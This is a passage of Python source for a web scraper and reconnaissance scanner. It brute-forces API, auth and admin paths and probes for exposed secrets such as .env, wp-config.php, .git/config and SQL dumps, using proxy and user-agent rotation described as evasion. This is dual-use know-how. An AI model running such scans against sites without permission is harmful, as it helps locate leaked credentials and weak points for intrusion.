    # ── Standard links / scripts ──────────────────
    for tag in soup.find_all('link', href=True):
        assets.add(urljoin(page_url, tag['href']))
    for tag in soup.find_all('script', src=True):
        assets.add(urljoin(page_url, tag['src']))

    # ── Images (all lazy-load attrs) ──────────────
    LAZY_ATTRS = (
        'src','data-src','data-lazy','data-original','data-lazy-src',
        'data-srcset','data-original-src','data-hi-res-src',
        'data-full-src','data-image','data-img','data-bg',
        'data-background','data-poster','data-thumb',
    )
    for tag in soup.find_all('img'):
        for attr in LAZY_ATTRS:
            v = tag.get(attr, '')
            if v and not v.startswith('data:'):
                assets.add(urljoin(page_url, v))
        for part in tag.get('srcset', '').split(','):
            u = part.strip().split(' ')[0]
            if u: assets.add(urljoin(page_url, u))

    # ── Video / Audio / Media ─────────────────────
    for tag in soup.find_all(['video', 'audio', 'source', 'track']):
        for attr in ('src', 'data-src', 'poster'):
            v = tag.get(attr, '')
            if v: assets.add(urljoin(page_url, v))
    # <video> direct src
    for tag in soup.find_all('video', src=True):
        assets.add(urljoin(page_url, tag['src']))
    # iframe embeds (video players)
    for tag in soup.find_all('iframe', src=True):
        s = tag['src']
        if any(x in s for x in ('youtube','vimeo','player','embed','video')):
            assets.add(urljoin(page_url, s))

    # ── Downloadable files ────────────────────────
    FILE_EXTS = (
        '.pdf','.zip','.rar','.7z','.tar','.gz',
        '.doc','.docx','.xls','.xlsx','.ppt','.pptx',
        '.mp3','.mp4','.avi','.mkv','.mov','.webm',
        '.apk','.exe','.dmg','.iso',
    )
    for tag in soup.find_all('a', href=True):
        h = tag['href']
        full = urljoin(page_url, h)
        low  = full.lower().split('?')[0]
        if any(low.endswith(ext) for ext in FILE_EXTS):
            assets.add(full)

    # ── CSS inline / style tag ────────────────────
    for tag in soup.find_all(style=True):
        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', tag['style']):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
    for st in soup.find_all('style'):
        css = st.string or ''
        for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
            if not u.startswith('data:'): assets.add(urljoin(page_url, u))
        for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
            assets.add(urljoin(page_url, u))

    # ── Meta tags (OG image etc) ──────────────────
    for tag in soup.find_all('meta'):
        prop = tag.get('property', '') + tag.get('name', '')
        if any(k in prop.lower() for k in ('image','thumbnail','banner','icon')):
            c = tag.get('content', '')
            if c.startswith('http'): assets.add(c)

    # ── Object / Embed ────────────────────────────
    for tag in soup.find_all(['object', 'embed']):
        v = tag.get('data', '') or tag.get('src', '')
        if v: assets.add(urljoin(page_url, v))

    # ── Regex sweep: static files in raw HTML/JS ──
    for m in re.finditer(
        r'["\']((https?://|/)[^"\'<>\s]+\.(js|css|woff2?|ttf|otf|eot'
        r'|png|jpg|jpeg|gif|svg|webp|avif|ico'
        r'|mp4|webm|mp3|ogg|wav'
        r'|pdf|zip|apk)(\?[^"\'<>\s]*)?)["\']',
        html, re.IGNORECASE
    ):
        u = m.group(1)
        if u.startswith('/'):
            u = urljoin(page_url, u)
        assets.add(u)

    # ── JSON-LD / structured data images ─────────
    for tag in soup.find_all('script', type='application/ld+json'):
        txt = tag.string or ''
        for m in re.finditer(r'"(https?://[^"]+\.(jpg|jpeg|png|webp|gif|svg))"', txt):
            assets.add(m.group(1))

    return assets


def extract_css_assets(css: str, css_url: str) -> set:
    assets = set()
    for u in re.findall(r'url\(["\']?(.+?)["\']?\)', css):
        u = u.strip().strip('"\'')
        if u and not u.startswith('data:') and not u.startswith('#'):
            assets.add(urljoin(css_url, u))
    for u in re.findall(r'@import\s+["\'](.+?)["\']', css):
        assets.add(urljoin(css_url, u))
    return assets


def extract_media_from_js(js_content: str, base_url: str) -> set:
    """
    Mine JS/JSON files for media URLs.
    Useful for React/Vue apps that store image paths in JS bundles.
    """
    assets = set()
    # Full URLs
    for m in re.finditer(
        r'["\`](https?://[^"\'`<>\s]{8,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
        js_content, re.IGNORECASE
    ):
        assets.add(m.group(1))
    # Relative paths
    for m in re.finditer(
        r'["\`](/[^"\'`<>\s]{3,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
        js_content, re.IGNORECASE
    ):
        assets.add(urljoin(base_url, m.group(1)))
    return assets


# ══════════════════════════════════════════════════
# 🗺️  SITEMAP PARSER
# ══════════════════════════════════════════════════

def fetch_sitemap(base_url: str) -> set:
    """
    Fetch sitemap.xml (and sitemap index) — returns all page URLs.
    Supports: /sitemap.xml, /sitemap_index.xml, /robots.txt discovery
    """
    urls   = set()

    def _fetch_one_sitemap(url: str, depth: int = 0):
        if depth > 3:   # FIX: recursion depth limit
            return
        try:
            r = requests.get(url, headers=_get_headers(), timeout=15, verify=False, proxies=proxy_manager.get_proxy())
            if r.status_code != 200:
                return
            text = r.text
            # Sitemap index → recurse
            if '<sitemapindex' in text:
                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
                    sub = m.group(1).strip()
                    if sub not in urls:
                        _fetch_one_sitemap(sub, depth + 1)
            else:
                for m in re.finditer(r'<loc>\s*(https?://[^<]+)\s*</loc>', text):
                    urls.add(m.group(1).strip())
        except Exception:
            pass

    # Try common sitemap locations
    parsed = urlparse(base_url)
    root   = f"{parsed.scheme}://{parsed.netloc}"

    # Check robots.txt for sitemap pointer first
    try:
        r = requests.get(f"{root}/robots.txt", headers=HEADERS,
                         timeout=8, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r.status_code == 200:
            for m in re.finditer(r'(?i)sitemap:\s*(https?://\S+)', r.text):
                _fetch_one_sitemap(m.group(1).strip())
    except Exception:
        pass

    if not urls:
        for path in ['/sitemap.xml', '/sitemap_index.xml',
                     '/sitemap/sitemap.xml', '/wp-sitemap.xml',
                     '/news-sitemap.xml', '/post-sitemap.xml',
                     '/page-sitemap.xml', '/product-sitemap.xml']:
            _fetch_one_sitemap(root + path)

    # Filter to same domain only
    netloc = parsed.netloc
    return {u for u in urls if urlparse(u).netloc == netloc}


# ══════════════════════════════════════════════════
# 🔌  API ENDPOINT DISCOVERY
# ══════════════════════════════════════════════════

# Common API paths for e-commerce + news/blog sites
_API_PATHS_ECOMMERCE = [
    # General Ecommerce
    '/api/products', '/api/v1/products', '/api/v2/products',
    '/api/categories', '/api/v1/categories',
    '/api/items', '/api/inventory',
    '/api/cart', '/api/orders', '/api/v1/orders',
    '/api/checkout', '/api/payments', '/api/shipping', # Added checkout & payments
    '/api/search', '/api/v1/search',
    '/api/users', '/api/v1/users', '/api/customers',   # Added customers
    '/api/config', '/api/settings',
    
    # WooCommerce REST API
    '/wp-json/wc/v3/products', '/wp-json/wc/v3/categories',
    '/wp-json/wc/v3/orders', '/wp-json/wc/v3/customers',
    '/wp-json/wc/v2/products', '/wp-json/wc/v2/orders',
    
    # Magento
    '/rest/V1/products', '/rest/V1/categories', '/rest/V1/orders',
    '/rest/default/V1/products',
    
    # GraphQL
    '/graphql', '/api/graphql', '/v1/graphql', '/graphql/schema.json',
    
    # Shopify
    '/products.json', '/collections.json', '/pages.json',
    '/collections/all/products.json', '/admin/api/2023-10/products.json',
    
    # General Base
    '/api', '/api/v1', '/api/v2', '/api/v3',
    '/rest/v1', '/rest/api',
]

_API_PATHS_NEWS = [
    # WordPress REST API
    '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages',
    '/wp-json/wp/v2/categories', '/wp-json/wp/v2/tags',
    '/wp-json/wp/v2/media', '/wp-json/wp/v2/users', '/wp-json',
    
    # General news APIs
    '/api/articles', '/api/posts', '/api/news', '/api/blogs',
    '/api/v1/articles', '/api/v1/posts', '/api/v2/posts',
    
    # Feeds & Sitemaps
    '/api/feed', '/feed.json', '/feed/json',
    '/rss', '/rss.xml', '/feed', '/feed.rss',
    '/atom.xml', '/sitemap.xml', '/sitemap_index.xml', '/sitemap-news.xml',
    
    # Ghost CMS
    '/ghost/api/v4/content/posts/', '/ghost/api/v3/content/posts/',
    
    # Strapi
    '/api/articles?populate=*', '/api/posts?populate=*',
    
    # Drupal JSON:API
    '/jsonapi/node/article', '/jsonapi/node/page',
]

_API_PATHS_GENERAL = [
    # Health & Info
    '/api/health', '/api/status', '/health', '/ping', '/healthcheck',
    '/version', '/api/version', '/info', '/api/info',
    
    # Documentation & Swagger
    '/.well-known/openapi.json', '/openapi.json', '/openapi.yaml',
    '/swagger.json', '/swagger.yaml', '/api-docs', '/swagger-ui.html',
    '/docs', '/api/docs', '/redoc', '/api/redoc',
    
    # Well-known & Discovery
    '/.well-known/security.txt', '/.well-known/core-config',
]

# ----------------- အသစ်ထပ်တိုးထားသောအပိုင်းများ ----------------- #

_API_PATHS_AUTH = [
    # Login & Authentication
    '/api/login', '/api/v1/login', '/api/auth', '/api/v1/auth',
    '/api/auth/login', '/api/users/login', '/api/admin/login',
    '/api/register', '/api/v1/register', '/api/auth/register', '/api/signup',
    
    # Tokens (JWT, OAuth)
    '/api/token', '/api/v1/token', '/oauth/token', '/oauth2/token',
    '/api/refresh', '/api/token/refresh', '/api/auth/refresh',
    
    # Current User Profile & Logout
    '/api/me', '/api/v1/me', '/api/user', '/api/current_user',
    '/api/logout', '/api/auth/logout',
    
    # WordPress Specific Auth Plugins (JWT Authentication)
    '/wp-json/jwt-auth/v1/token', '/wp-json/aam/v2/authenticate',
]

_API_PATHS_ADMIN = [
    # Admin Panels & Dashboards
    '/api/admin', '/api/v1/admin', '/admin/api',
    '/api/dashboard', '/api/system', '/api/config', '/api/settings',
    '/api/admin/users', '/api/admin/settings',
    '/admin/dashboard.json', '/api/stats', '/api/metrics',
    
    # Spring Boot Actuator (Java)
    '/actuator/health', '/actuator/info', '/manage/health', '/manage/info'
]

# ── API paths တိုးချဲ့ ────────────────────────────
_API_PATHS_MOBILE = [
    # Mobile / App APIs
    '/api/v1/app', '/api/v2/app', '/api/mobile',
    '/api/v1/config', '/api/v2/config',
    '/api/notifications', '/api/v1/notifications',
    '/api/v1/feed', '/api/v2/feed',
    '/api/social', '/api/friends', '/api/followers',
    '/api/messages', '/api/v1/messages',
    '/api/upload', '/api/media', '/api/files',
    '/api/analytics', '/api/events', '/api/tracking',
]

_API_PATHS_FINANCE = [
    # Fintech / Payment / Crypto
    '/api/payments', '/api/v1/payments', '/api/transactions',
    '/api/wallet', '/api/balance', '/api/withdraw', '/api/deposit',
    '/api/exchange', '/api/rates', '/api/currency',
    '/api/invoice', '/api/billing', '/api/subscriptions',
    '/api/v1/subscriptions', '/api/plans',
    '/api/crypto', '/api/coins', '/api/market',
    '/api/accounts', '/api/v1/accounts', '/api/v2/accounts',
]

_API_PATHS_SAAS = [
    # SaaS / Dashboard
    '/api/workspaces', '/api/projects', '/api/teams',
    '/api/members', '/api/invitations', '/api/roles',
    '/api/reports', '/api/exports', '/api/imports',
    '/api/webhooks', '/api/integrations', '/api/plugins',
    '/api/audit', '/api/logs', '/api/activity',
    # Laravel / Sanctum / Passport
    '/api/csrf-cookie', '/api/user', '/sanctum/csrf-cookie',
    '/oauth/authorize', '/oauth/clients', '/oauth/personal-access-tokens',
    # Django REST Framework
    '/api/schema/', '/api/schema/swagger-ui/', '/api/schema/redoc/',
    # FastAPI / Starlette
    '/docs', '/redoc', '/openapi.json',
    # Next.js API routes
    '/api/_next', '/api/auth/[...nextauth]', '/api/auth/session',
    '/api/auth/csrf', '/api/auth/providers',
    # Supabase / Firebase-style
    '/rest/v1/', '/auth/v1/', '/storage/v1/',
]

ALL_API_PATHS = list(dict.fromkeys(
    _API_PATHS_ECOMMERCE +
    _API_PATHS_NEWS      +
    _API_PATHS_GENERAL   +
    _API_PATHS_AUTH      +   # ← Fix: ပါမနေတာ ထည့်
    _API_PATHS_ADMIN     +   # ← Fix: ပါမနေတာ ထည့်
    _API_PATHS_MOBILE    +
    _API_PATHS_FINANCE   +
    _API_PATHS_SAAS
))


# ── API URL patterns in JS bundles ─────────────
_JS_API_PATTERNS = [
    re.compile(r"""(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""(?:url|endpoint|baseURL|apiUrl|API_URL)\s*[:=]\s*['"`]([^'"`\s]{5,200})['"`]"""),
    re.compile(r"""['"`](/api/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/rest/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"""['"`](/v\d+/[^\s'"`\?#]{3,100})['"`]"""),
    re.compile(r"['\"`](https?://[^\s'\"` ]{10,200}/api/[^\s'\"` ?#]{2,100})['\"`]"),
]

def _extract_api_urls_from_js(js_text: str, base_root: str) -> list:
    """JS bundle/source ထဲက API URL တွေ mine လုပ်"""
    found = set()
    for pat in _JS_API_PATTERNS:
        for m in pat.findall(js_text):
            url = m.strip()
            if not url or len(url) < 4:
                continue
            if url.startswith('/'):
                url = base_root + url
            if url.startswith('http') and '/api/' not in url and '/rest/' not in url and '/v' not in url:
                continue
            if url.startswith('http') or url.startswith('/'):
                found.add(url)
    return list(found)


def _extract_api_urls_from_html(html: str, base_root: str) -> list:
    """HTML source ထဲက API references mine လုပ်"""
    found = set()
    soup  = BeautifulSoup(html, 'html.parser')

    # data-* attributes
    for tag in soup.find_all(True):
        for attr, val in tag.attrs.items():
            if isinstance(val, str) and ('/api/' in val or '/rest/' in val):
                if val.startswith('/') or val.startswith('http'):
                    url = (base_root + val) if val.startswith('/') else val
                    found.add(url.split('?')[0])

    # Inline scripts
    for script in soup.find_all('script'):
        if script.string:
            for url in _extract_api_urls_from_js(script.string, base_root):
                found.add(url.split('?')[0])

    # <link rel="..."> and <a href="..."> with /api/
    for tag in soup.find_all(['link', 'a'], href=True):
        href = tag['href']
        if '/api/' in href or '/graphql' in href:
            url = (base_root + href) if href.startswith('/') else href
            found.add(url.split('?')[0])

    return list(found)


def _mine_js_bundles(html: str, root: str, proxies) -> list:
    """External JS files တွေ download ပြီး API URLs ထုတ်"""
    soup = BeautifulSoup(html, 'html.parser')
    js_urls = []
    for tag in soup.find_all('script', src=True):
        src = tag['src']
        if not src: continue
        if src.startswith('//'):
            src = 'https:' + src
        elif src.startswith('/'):
            src = root + src
        if src.startswith('http') and ('chunk' in src or 'bundle' in src or
                'main' in src or 'app' in src or 'vendor' in src or 'index' in src):
            js_urls.append(src)

    found = set()
    for js_url in js_urls[:8]:   # max 8 JS bundles
        try:
            r = requests.get(js_url, headers=HEADERS, timeout=10, verify=False, proxies=proxy_manager.get_proxy())
            if r.status_code == 200 and len(r.text) > 100:
                for url in _extract_api_urls_from_js(r.text, root):
                    found.add(url.split('?')[0])
        except Exception:
            pass
    return list(found)


def _check_robots_and_sitemap(root: str, proxies) -> list:
    """robots.txt / sitemap.xml ထဲက API paths ရှာ"""
    found = set()
    # robots.txt — Disallow paths with /api/
    try:
        r = requests.get(root + '/robots.txt', headers=HEADERS,
                         timeout=8, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r.status_code == 200:
            for line in r.text.splitlines():
                line = line.strip()
                if line.lower().startswith(('disallow:', 'allow:')):
                    path = line.split(':', 1)[1].strip()
                    if any(kw in path for kw in ['/api/', '/rest/', '/v1/', '/v2/', '/graphql']):
                        found.add(root + path.split('*')[0].rstrip('$'))
    except Exception:
        pass
    return list(found)


def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
    """
    Comprehensive API discovery:
    1. Predefined path brute-force (ALL_API_PATHS)
    2. HTML source mining (data-* attrs, inline scripts)
    3. JS bundle mining (fetch/axios/url patterns)
    4. robots.txt / sitemap discovery
    5. CORS header detection
    Returns: {"found": [...], "js_mined": [...], "html_mined": [...],
              "robots": [...], "stats": {...}}
    """
    parsed  = urlparse(base_url)
    root    = f"{parsed.scheme}://{parsed.netloc}"

    # ── Phase 0: Fetch homepage for mining ───────
    homepage_html = None
    try:
        r0 = requests.get(base_url, headers=HEADERS, timeout=12, verify=False,
                         proxies=proxy_manager.get_proxy())
        if r0.status_code == 200:
            homepage_html = r0.text
    except Exception:
        pass

    # ── Phase 1: HTML + JS mining (parallel) ─────
    html_mined = []
    js_mined   = []
    robots_found = []

    if homepage_html:
        if progress_cb: progress_cb("🔍 HTML source mining...")
        html_mined = _extract_api_urls_from_html(homepage_html, root)

        if progress_cb: progress_cb("📦 JS bundle mining...")
        js_mined   = _mine_js_bundles(homepage_html, root, None)

    if progress_cb: progress_cb("🤖 robots.txt scanning...")
    robots_found = _check_robots_and_sitemap(root, None)

    # ── Phase 2: Path brute-force ─────────────────
    found  = []
    seen   = set()

    def _probe(path: str) -> dict | None:
        url = root + path if path.startswith('/') else path
        try:
            r = requests.get(
                url,
                headers={**HEADERS, 'Accept': 'application/json, text/plain, */*'},
                timeout=7, verify=False,
                allow_redirects=True,
                proxies=proxy_manager.get_proxy()
            )
            ct  = r.headers.get('Content-Type', '')
            cors = r.headers.get('Access-Control-Allow-Origin', '')
            size = len(r.content)

            endpoint = {
                "url":    url,
                "status": r.status_code,
                "cors":   cors if cors else None,
                "size_b": size,
                "preview": "",
                "type":   "OTHER",
                "method": "GET",
            }

            if r.status_code in (401, 403):
                endpoint["type"] = "PROTECTED"
                return endpoint

            if r.status_code in (405,):   # Method Not Allowed → endpoint exists
                endpoint["type"] = "PROTECTED"
                endpoint["note"] = "POST only"
                return endpoint

            if r.status_code == 200 and size > 5:
                body = r.text[:400].strip()
                if 'json' in ct or body.startswith(('{', '[')):
                    endpoint["type"]    = "JSON_API"
                    endpoint["preview"] = body[:150]
                    # Try to detect if it's GraphQL
                    if '/graphql' in url or ('"data"' in body and '"errors"' in body):
                        endpoint["type"] = "GRAPHQL"
                elif 'xml' in ct or 'rss' in ct or 'atom' in ct:
                    endpoint["type"]    = "XML/RSS"
                    endpoint["preview"] = body[:100]
                elif 'html' in ct and ('/swagger' in url or '/redoc' in url or '/docs' in url):
                    endpoint["type"]    = "API_DOCS"
                    endpoint["preview"] = "Swagger/OpenAPI docs"
                elif size > 20:
                    endpoint["type"]    = "OTHER"
                    endpoint["preview"] = body[:80]
                else:
                    return None
                return endpoint
        except Exception:
            pass
        return None

    # ── Probe ALL paths (brute-force) ─────────────
    # Also probe mined URLs
    all_probe_paths = list(ALL_API_PATHS)
    # Add mined paths (path-only)
    for mined_url in (html_mined + js_mined + robots_found):
        try:
            p = urlparse(mined_url).path
            if p and p not in all_probe_paths and len(p) < 150:
                all_probe_paths.append(p)
        except Exception:
            pass

    total = len(all_probe_paths)
    if progress_cb:
        progress_cb(f"🔌 Path scanning: `{total}` paths...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        fmap = {ex.submit(_probe, path): path for path in all_probe_paths}
        done = 0
        for fut in concurrent.futures.as_completed(fmap, timeout=90):
            done += 1
            try:
                result = fut.result(timeout=10)
                if result and result["url"] not in seen:
                    seen.add(result["url"])
                    found.append(result)
            except Exception:
                pass
            if progress_cb and done % 15 == 0:
                progress_cb(
                    f"🔌 Scanning: `{done}/{total}`\n"
                    f"✅ JSON: `{sum(1 for e in found if e['type']=='JSON_API')}` | "
                    f"🔒 Protected: `{sum(1 for e in found if e['type']=='PROTECTED')}` | "
                    f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}`"
                )

    _type_order = {"JSON_API": 0, "GRAPHQL": 1, "XML/RSS": 2,
                   "API_DOCS": 3, "PROTECTED": 4, "OTHER": 5}
    found.sort(key=lambda x: _type_order.get(x["type"], 9))

    return {
        "found":       found,
        "js_mined":    list(set(js_mined)),
        "html_mined":  list(set(html_mined)),
        "robots":      robots_found,
        "stats": {
            "total_probed":   total,
            "json_apis":      sum(1 for e in found if e["type"] == "JSON_API"),
            "graphql":        sum(1 for e in found if e["type"] == "GRAPHQL"),
            "xml_rss":        sum(1 for e in found if e["type"] == "XML/RSS"),
            "api_docs":       sum(1 for e in found if e["type"] == "API_DOCS"),
            "protected":      sum(1 for e in found if e["type"] == "PROTECTED"),
            "other":          sum(1 for e in found if e["type"] == "OTHER"),
            "js_urls_found":  len(js_mined),
            "html_urls_found":len(html_mined),
        }
    }



def get_internal_links(html: str, base_url: str) -> set:
    soup    = BeautifulSoup(html, 'html.parser')
    netloc  = urlparse(base_url).netloc
    links   = set()
    for a in soup.find_all('a', href=True):
        h = a['href']
        if h.startswith(('#','mailto:','tel:','javascript:')): continue
        full = urljoin(base_url, h)
        p    = urlparse(full)
        if p.netloc == netloc:
            links.add(p._replace(fragment='').geturl())
    return links



# ══════════════════════════════════════════════════
# ✂️  FILE SPLITTER
# ══════════════════════════════════════════════════

def split_zip(zip_path: str, part_mb: float = SPLIT_MB) -> list:
    part_size = int(part_mb * 1024 * 1024)
    base  = zip_path.replace('.zip','')
    parts = []
    num   = 1
    with open(zip_path,'rb') as f:
        while True:
            chunk = f.read(part_size)
            if not chunk: break
            p = f"{base}.part{num:02d}.zip"
            with open(p,'wb') as pf: pf.write(chunk)
            parts.append(p)
            num += 1
    return parts

def needs_split(path: str) -> bool:
    return os.path.getsize(path) > SPLIT_MB * 1024 * 1024


# ══════════════════════════════════════════════════
# 🛡️  VULNERABILITY SCANNER  v4
#     - Cloudflare catch-all detection
#     - Baseline fingerprint comparison
#     - Adaptive delay (anti-rate-limit)
#     - Real subdomain verification
# ══════════════════════════════════════════════════

_COMMON_SUBDOMAINS = [
    "api", "admin", "dev", "staging", "test",
    "beta", "app", "portal", "dashboard", "panel",
    "manage", "backend", "internal", "static",
    "mail", "backup", "vpn", "git", "gitlab",
    "jenkins", "ci", "build", "docs", "help",
    "shop", "store", "blog", "status", "monitor",
    "db", "database", "phpmyadmin", "cdn", "media",
    "assets", "files", "upload", "img", "images",
    "auth", "login", "sso", "oauth", "api2",
]

_VULN_PATHS = [
    # CRITICAL — Credentials
    ("/.env",                     "🔑 .env file",               "CRITICAL"),
    ("/.env.local",               "🔑 .env.local",              "CRITICAL"),
    ("/.env.backup",              "🔑 .env.backup",             "CRITICAL"),
    ("/.env.production",          "🔑 .env.production",         "CRITICAL"),
    ("/wp-config.php",            "🔑 wp-config.php",           "CRITICAL"),
    ("/wp-config.php.bak",        "🔑 wp-config.php.bak",       "CRITICAL"),
    ("/config.php",               "🔑 config.php",              "HIGH"),
    ("/config.yml",               "🔑 config.yml",              "HIGH"),
    ("/config.json",              "🔑 config.json",             "HIGH"),
    ("/database.yml",             "🔑 database.yml",            "HIGH"),
    ("/settings.py",              "🔑 settings.py",             "HIGH"),
    # CRITICAL — VCS
    ("/.git/config",              "📁 .git/config",             "CRITICAL"),
    ("/.git/HEAD",                "📁 .git/HEAD",               "CRITICAL"),
    ("/.svn/entries",             "📁 .svn entries",            "HIGH"),
    # CRITICAL — Backups
    ("/backup.zip",               "🗜️ backup.zip",              "CRITICAL"),
    ("/backup.sql",               "🗜️ backup.sql",              "CRITICAL"),
    ("/dump.sql",                 "🗜️ dump.sql",                "CRITICAL"),
    ("/db.sql",                   "🗜️ db.sql",                  "CRITICAL"),
    ("/backup.tar.gz",            "🗜️ backup.tar.gz",           "CRITICAL"),
    ("/site.zip",                 "🗜️ site.zip",                "HIGH"),
    # HIGH — Admin panels
    ("/phpmyadmin/",              "🔐 phpMyAdmin",              "HIGH"),
    ("/pma/",                     "🔐 phpMyAdmin /pma/",        "HIGH"),
    ("/adminer.php",              "🔐 Adminer DB UI",           "HIGH"),
    ("/admin",                    "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/",                   "🔐 Admin Panel",             "MEDIUM"),
    ("/admin/login",              "🔐 Admin Login",             "MEDIUM"),
    ("/wp-admin/",                "🔐 WordPress Admin",         "MEDIUM"),
    ("/administrator/",           "🔐 Joomla Admin",            "MEDIUM"),
    ("/dashboard",                "🔐 Dashboard",               "MEDIUM"),
    ("/login",                    "🔐 Login Page",              "LOW"),
    # HIGH — Logs
    ("/error.log",                "📋 error.log",               "HIGH"),
    ("/access.log",               "📋 access.log",              "HIGH"),
    ("/debug.log",                "📋 debug.log",               "HIGH"),
    ("/storage/logs/laravel.log", "📋 Laravel log",             "HIGH"),
    # MEDIUM — Server info
    ("/server-status",            "⚙️ Apache server-status",   "MEDIUM"),
    ("/web.config",               "⚙️ web.config",             "HIGH"),
    ("/.htaccess",                "⚙️ .htaccess",              "MEDIUM"),
    ("/xmlrpc.php",               "⚠️ xmlrpc.php",             "MEDIUM"),
    # LOW
    ("/composer.json",            "📦 composer.json",           "LOW"),
    ("/package.json",             "📦 package.json",            "LOW"),
    ("/requirements.txt",         "📦 requirements.txt",        "LOW"),
    # INFO
    ("/robots.txt",               "🤖 robots.txt",              "INFO"),
    ("/sitemap.xml",              "🗺️ sitemap.xml",             "INFO"),
]

_SEV_EMOJI = {"CRITICAL":"🔴","HIGH":"🟠","MEDIUM":"🟡","LOW":"🔵","INFO":"⚪"}
_SEV_ORDER = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
_SEC_HEADERS = {
    "Strict-Transport-Security": ("HSTS",           "HIGH"),
    "Content-Security-Policy":   ("CSP",            "MEDIUM"),
    "X-Frame-Options":           ("X-Frame-Options","MEDIUM"),
    "X-Content-Type-Options":    ("X-Content-Type", "LOW"),
    "Referrer-Policy":           ("Referrer-Policy","LOW"),
    "Permissions-Policy":        ("Permissions-Policy","LOW"),
}
_FAKE_SIGS = [
    b"404", b"not found", b"page not found",
    b"does not exist", b"no such file",
]

# User-Agents rotation (avoid rate limiting) — 60+ UAs for better evasion (updated 2025/2026)
_UA_LIST = [
    # ── Chrome — Windows (latest) ────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    # ── Chrome — Windows (slightly older, still common) ──────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.185 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36',
    # ── Chrome — macOS ───────────────────────────────────────────────
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Chrome — Linux ───────────────────────────────────────────────
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    # ── Firefox — Windows ────────────────────────────────────────────
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
